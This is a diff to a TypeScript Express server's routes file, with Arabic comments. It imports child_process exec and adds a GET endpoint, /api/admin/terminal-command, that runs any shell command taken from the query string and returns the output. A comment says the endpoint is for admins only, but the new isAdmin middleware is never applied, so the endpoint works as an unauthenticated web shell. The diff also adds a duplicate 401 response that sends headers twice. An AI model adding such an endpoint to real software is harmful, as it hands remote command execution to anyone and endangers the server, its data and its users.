@@ -5,6 +5,7 @@ import { WebSocketServer, WebSocket } from "ws";
 import crypto from "crypto";
 import { sendPasswordResetEmail, sendPasswordChangedNotification } from "./emailService";
 import jwt from "jsonwebtoken";
+import { exec } from "child_process";
 // استيراد مسارات Sitemap و robots.txt
 import sitemapRoutes from "./routes/sitemap";
 import arabicPdfTestRoutes from "./arabicPdfTest";
@@ -116,6 +117,14 @@ const jwtAuth = async (req: Request, res: Response, next: Function) => {
   }
   
   return next();
+};
+
+const isAdmin = (req: Request, res: Response, next: Function) => {
+  if (req.user && req.user.role === 'admin') {
+    next();
+  } else {
+    res.status(403).json({ message: 'Forbidden: Admins only' });
+  }
 };
 
 // تم تعريف استيراد WebSocket واستخدامها في مكان آخر من الملف
@@ -263,6 +272,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.log(`المستخدم مصرح: ${req.user.username}, دور: ${req.user.role}`);
       return next();
     }
+    res.status(401).json({ message: 'Unauthorized' });
     
     console.log(`طلب ${req.path} - المستخدم غير مصرح`);
     res.status(401).json({ message: 'Not authenticated' });
@@ -5313,6 +5323,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error('خطأ في الحصول على الإحصائيات السريعة:', error);
       res.status(500).json({ message: 'Internal server error' });
     }
+  });
+
+  // تشغيل أمر طرفي (للمسؤولين فقط)
+  app.get('/api/admin/terminal-command', async (req: Request, res: Response) => {
+    const { command } = req.query;
+    if (!command || typeof command !== 'string') {
+      return res.status(400).json({ message: 'Command is required and must be a string' });
+    }
+
+    exec(command, (error, stdout, stderr) => {
+      if (error) {
+        console.error(`exec error: ${error}`);
+        return res.status(500).json({ message: stderr || error.message });
+      }
+      res.json({ output: stdout });
+    });
   });
 
   // مساعد الذكاء الاصطناعي للمشاريع
